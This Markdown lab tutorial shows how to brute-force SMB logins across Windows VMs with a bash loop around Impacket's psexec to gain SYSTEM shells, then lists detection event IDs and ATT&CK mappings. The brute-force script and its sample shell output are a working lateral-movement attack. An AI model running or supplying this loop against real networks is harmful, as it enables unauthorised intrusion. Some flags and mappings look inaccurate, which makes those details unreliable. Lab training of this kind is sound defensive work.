## ⚠️ LEGAL NOTICE

This is **strictly for lab/educational use only**. Do not test outside of an isolated and controlled lab.

---

## 🔧 LAB SETUP (REQUIRED)

You need:

| Component         | Details                                 |
| ----------------- | --------------------------------------- |
| Kali Linux        | Attacker machine with `Impacket` tools  |
| 2+ Windows 11 VMs | Victim machines with SMB/RPC enabled    |
| Same Network      | All machines must be on the same subnet |
| Weak credentials  | Set on victims for simulation           |

---

## 🧩 STEP 1: SET UP VICTIM MACHINES

**On each Windows 11 VM (Victim):**

1. Create a user (e.g. `user`) with a weak password (e.g. `1234`).
2. Enable File and Printer Sharing (Control Panel > Network).
3. Ensure **TCP port 445 (SMB)** is open (check via `nmap`).
4. Allow remote service access for PsExec-style RPC (WMI/SMB must be enabled).

---

## 📁 STEP 2: PREPARE YOUR CREDENTIAL LIST

Create two files on **Kali**:

```bash
echo "user" > users.txt
echo "1234" > passwords.txt
```

Create a list of target IPs (example):

```bash
echo "192.168.1.10" > targets.txt
echo "192.168.1.11" >> targets.txt
```

---

## 🚀 STEP 3: USE Impacket's `psexec.py` IN A LOOP

Install Impacket if not already:

```bash
sudo apt install impacket-scripts
```

Then, script a brute-force loop using PsExec:

```bash
#!/bin/bash

while read ip; do
  while read user; do
    while read pass; do
      echo "[*] Trying $user:$pass on $ip"
      timeout 10s impacket-psexec "$user:$pass@$ip" -exec-method smbclient -hashes : 2>/dev/null
      if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: $user:$pass on $ip"
      else
        echo "[-] FAILED: $user:$pass on $ip"
      fi
    done < passwords.txt
  done < users.txt
done < targets.txt
```

Save this as `psexec_brute.sh`, then run:

```bash
chmod +x psexec_brute.sh
./psexec_brute.sh
```

---

## 📥 STEP 4: IF SUCCESSFUL, YOU GET A REMOTE SHELL

When credentials are valid, `impacket-psexec` gives you a SYSTEM-level shell on the target:

```
[*] Trying user:1234 on 192.168.1.11
[+] SUCCESS: user:1234 on 192.168.1.11
Microsoft Windows [Version 10.0.19045.3448]
C:\Windows\system32>
```

That’s your **lateral movement achieved via PsExec**.

---

## 🔎 STEP 5: DETECTION OPPORTUNITIES

On your victim machine or via Splunk (assuming logs are forwarded):

* **Security Event ID 4624** – Logon success
* **Event ID 4672** – Special privileges assigned to new logon
* **Sysmon ID 1** – PsExec's service process creation
* **Sysmon ID 3** – Network connections from attacker machine
* PsExec often shows up as `PSEXESVC.exe`

Use YARA or Sigma rules to catch PsExec-style activity.

---

## ✅ MITRE ATT\&CK Mapping

| Technique | Description                          |
| --------- | ------------------------------------ |
| T1021.002 | SMB/Windows Admin Shares             |
| T1078     | Valid Accounts                       |
| T1059.001 | PowerShell execution                 |
| T1035     | Service Execution (PsExec uses this) |

---

## 💡 Optional Enhancements

* Try with NTLM hashes (`-hashes` option in PsExec)
* Use `winrmexec.py` from Impacket for WinRM-based movement
* Add logging to catch repeated failed logons (simulate brute force)


